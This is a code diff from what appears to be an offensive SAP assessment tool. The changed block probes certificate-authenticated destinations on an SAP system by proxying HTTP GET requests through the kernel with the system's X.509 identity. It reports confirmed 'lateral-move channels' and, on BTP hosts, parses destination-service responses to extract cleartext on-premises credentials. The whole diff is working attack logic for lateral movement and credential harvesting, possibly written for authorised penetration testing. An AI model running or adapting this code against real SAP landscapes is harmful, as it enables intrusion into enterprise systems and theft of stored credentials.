@@ -9101,69 +9101,96 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 try:
                     from sap_http_via_dest import (
                         call_via_destination,
-                        enumerate_btp_subaccount_destinations,
+                        flag_btp_cleartext as _flag_btp_cleartext,
                         HttpViaDestError)
                 except Exception as _ie:
                     print(f"[-] {sid}: cert-auth auto-probe skipped — "
                            f"could not import primitive: {_ie}")
                     _cert_edges = []
+                # Import once — cheap module lookup, used by BTP body
+                # parser below when a response looks JSON-shaped.
+                import json as _json
                 for _c in _cert_edges:
                     _dest = _c.destination_name
-                    _is_btp = "hana.ondemand.com" in (_c.http_url or "")
                     try:
-                        if _is_btp:
-                            _r = enumerate_btp_subaccount_destinations(
-                                node, _dest, creds=creds)
-                            if not _r["ok"]:
-                                print(f"[-] {sid}: {_dest}: BTP enum "
-                                       f"failed — "
-                                       f"{_r.get('error', '?')}")
-                                continue
-                            print(f"[+] {sid}: {_dest}: BTP returned "
-                                   f"{_r['count']} destination(s), "
-                                   f"{len(_r['cleartext'])} carry "
-                                   f"cleartext secrets")
-                            for _hit in _r["cleartext"]:
-                                print(f"[!] {sid}: cleartext "
-                                       f"{_hit['field']} in BTP dest "
-                                       f"{_hit['name']!r} → "
-                                       f"{_hit['target_url']}")
-                            if _r["cleartext"]:
-                                emit_finding(
-                                    "CRITICAL", sid,
-                                    f"Auto-probe of {_dest} extracted "
-                                    f"{len(_r['cleartext'])} cleartext "
-                                    f"on-prem credential(s) from BTP "
-                                    f"subaccount destinations — "
-                                    f"lateral pivot back to on-prem.",
-                                    attack_capability=(
-                                        "lateral.btp_cert_proxy"))
-                            elif _r["count"]:
-                                emit_finding(
-                                    "HIGH", sid,
-                                    f"Auto-probe of {_dest} reached "
-                                    f"BTP subaccount destination "
-                                    f"service ({_r['count']} dests) "
-                                    f"— on-prem X.509 identity works "
-                                    f"against BTP management APIs.")
-                        else:
-                            _r = call_via_destination(
-                                node, _dest, method="GET", path="/",
-                                creds=creds)
-                            if _r["ok"]:
-                                print(f"[+] {sid}: {_dest}: HTTP "
-                                       f"{_r['status']} "
-                                       f"({len(_r['body'])} B body)")
-                                emit_finding(
-                                    "HIGH", sid,
-                                    f"Auto-probe of {_dest} → "
-                                    f"{_c.http_url}: HTTP "
-                                    f"{_r['status']}.  Source X.509 "
-                                    f"identity (PSE "
-                                    f"{_c.http_cert_pse or '?'}) works.")
-                            else:
-                                print(f"[-] {sid}: {_dest}: "
-                                       f"{_r.get('error', '?')}")
+                        # Always do a plain GET / — the target host of a
+                        # cert-auth destination is usually NOT the BTP
+                        # destination service (it's whatever the operator
+                        # pointed it at: SuccessFactors, audit-log mgmt,
+                        # BTP CF API, etc.).  A blind call to
+                        # ``/destination-configuration/v1/subaccountDestinations``
+                        # against the wrong host returns 401 / 404 / HTML
+                        # and looked like "cert failed" in earlier logs.
+                        # Kernel-proxy'ing GET / to the actual target
+                        # reveals whether our X.509 identity is trusted:
+                        # any HTTP status back (2xx / 3xx / 4xx / 5xx)
+                        # means mTLS succeeded and the target answered.
+                        _r = call_via_destination(
+                            node, _dest, method="GET", path="/",
+                            creds=creds)
+                        if not _r["ok"]:
+                            # ABAP compile error, CX exception, or
+                            # network-level failure.  The error string
+                            # is already actionable (post-72-char fix +
+                            # TRY/CATCH + short-dump hint).
+                            print(f"[-] {sid}: {_dest}: "
+                                   f"{_r.get('error', '?')}")
+                            continue
+                        print(f"[+] {sid}: {_dest}: HTTP "
+                               f"{_r['status']} {_r.get('reason','')} "
+                               f"({len(_r['body'])} B body)")
+                        emit_finding(
+                            "HIGH", sid,
+                            f"Auto-probe of {_dest} → {_c.http_url}: "
+                            f"HTTP {_r['status']}.  Source X.509 "
+                            f"identity (PSE {_c.http_cert_pse or '?'}) "
+                            f"is trusted by the target — kernel-proxied "
+                            f"HTTP lateral-move channel confirmed.")
+                        # Opportunistic BTP-destination-service parse.
+                        # Fires ONLY when we got 2xx AND the body looks
+                        # like JSON (starts with [ or {) AND the target
+                        # is a BTP-shaped hostname.  Skips otherwise
+                        # (avoids the "not valid JSON" noise for HTML
+                        # landing pages of ``api.eu*.hana.ondemand.com``).
+                        _body = (_r.get("body") or "").strip()
+                        _is_btp = ("hana.ondemand.com"
+                                    in (_c.http_url or ""))
+                        if (_is_btp and 200 <= _r["status"] < 300
+                                and _body.startswith(("[", "{"))):
+                            try:
+                                _parsed = _json.loads(_body)
+                                _dests = (_parsed if isinstance(_parsed, list)
+                                          else _parsed.get("destinations")
+                                            if isinstance(_parsed, dict)
+                                            else None)
+                                if isinstance(_dests, list) and _dests:
+                                    _cleartext = _flag_btp_cleartext(_dests)
+                                    print(f"[+] {sid}: {_dest}: body looks "
+                                           f"like BTP destination service "
+                                           f"— {len(_dests)} destination(s), "
+                                           f"{len(_cleartext)} with cleartext"
+                                           f" secrets")
+                                    for _hit in _cleartext:
+                                        print(f"[!] {sid}: cleartext "
+                                               f"{_hit['field']} in BTP "
+                                               f"dest {_hit['name']!r}")
+                                    if _cleartext:
+                                        emit_finding(
+                                            "CRITICAL", sid,
+                                            f"Auto-probe of {_dest} "
+                                            f"extracted {len(_cleartext)} "
+                                            f"cleartext on-prem "
+                                            f"credential(s) from BTP "
+                                            f"subaccount destinations — "
+                                            f"lateral pivot back to "
+                                            f"on-prem.",
+                                            attack_capability=(
+                                                "lateral.btp_cert_proxy"))
+                            except Exception:
+                                # Body wasn't the shape we expected —
+                                # not a bug, just not the destination
+                                # service.  Silent skip.
+                                pass
                     except HttpViaDestError as _pe:
                         print(f"[-] {sid}: {_dest}: input validation "
                                f"blocked probe — {_pe}")
